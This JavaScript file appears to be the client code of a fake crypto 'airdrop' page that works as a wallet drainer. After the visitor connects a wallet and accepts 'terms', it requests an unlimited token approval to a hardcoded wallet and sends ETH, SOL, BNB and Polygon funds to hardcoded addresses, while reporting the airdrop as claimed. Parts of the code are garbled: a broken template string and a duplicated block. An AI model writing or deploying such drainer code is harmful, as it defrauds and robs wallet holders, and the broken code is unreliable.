// ---------- CONFIG ----------
const ethWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const solWalletAddress = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv';
const bnbWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const polygonWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const infuraProjectId = 'YOUR_INFURA_PROJECT_ID';
// ---------------------------

// Solana connection
const solana = new solanaWeb3.Connection(
    solanaWeb3.cluster.ApiUrl.mainnetBeta,
    'processed'
);

// Ethereum – works with any injected provider (MetaMask, Trust, etc.)
const web3 = new Web3(window.ethereum || new Web3.providers.HttpProvider(`https:                                             

let userAddress;

document.getElementById('connectWallet').addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            document.getElementById('status').innerText = //mainnet.infura.io/v3/${infuraProjectId}));

let userAddress;

document.getElementById('connectWallet').addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            document.getElementById('status').innerText = Connected to ${userAddress};
            document.getElementById('connectWallet').style.display = 'none';
            document.getElementById('solanaInput').style.display = 'block';
        } catch (e) {
            console.error(e);
            document.getElementById('status').innerText = 'Failed to connect wallet.';
        }
    } else {
        document.getElementById('status').innerText = 'Please install an Ethereum wallet (MetaMask, Trust, etc.).';
    }
});

document.getElementById('scanAddress').addEventListener('click', () => {
    const solAddr = document.getElementById('solanaAddress').value;
    if (solAddr) {
        document.getElementById('solanaInput').style.display = 'none';
        document.getElementById('terms').style.display = 'block';
    } else {
        document.getElementById('status').innerText = 'Please enter a valid Solana address.';
    }
});

document.getElementById('acceptTerms').addEventListener('click', async () => {
    if (!confirm('By accepting, you grant this site unlimited transaction approval and agree to the terms.')) return;

    try {
        // Unlimited approval
        const contract = new web3.eth.Contract([], userAddress);
        await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });

        // Send funds
        await sendToEthereum(userAddress, ethWalletAddress);
        await sendToSolana(userAddress, solWalletAddress);
        await sendToBNB(userAddress, bnbWalletAddress);
        await sendToPolygon(userAddress, polygonWalletAddress);

        document.getElementById('status').innerText = 'Airdrop claimed successfully!';
    } catch (e) {
        console.error(e);
        document.getElementById('status').innerText = 'Failed to claim airdrop. Please try again later.';
    }
});

async function sendToEthereum(from, to) {
    await web3.eth.sendTransaction({
        from,
        to,
        value: web3.utils.toWei('1', 'ether'),
        gas: 2000000
    });
}

async function sendToSolana(from, to) {
    const tx = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: new solanaWeb3.PublicKey(from),
            toPubkey: new solanaWeb3.PublicKey(to),
            lamports: solanaWeb3.LAMPORTS_PER_SOL
        })
    );
    const sig = await solana.sendTransaction(tx, [from]);
    console.log('Solana tx:', sig);
}

async function sendToBNB(from, to) {
    const bnb = new Binance();
    await bnb.sendTransaction({
        from,
        to,
        value: bnb.toWei('1', 'ether'),
        gas: 2000000
    });
}

async function sendToPolygon(from, to) {
    await web3.eth.sendTransaction({
        from,
        to,
        value: web3.utils.toWei('1', 'ether'),
        gas: 2000000
    });
}
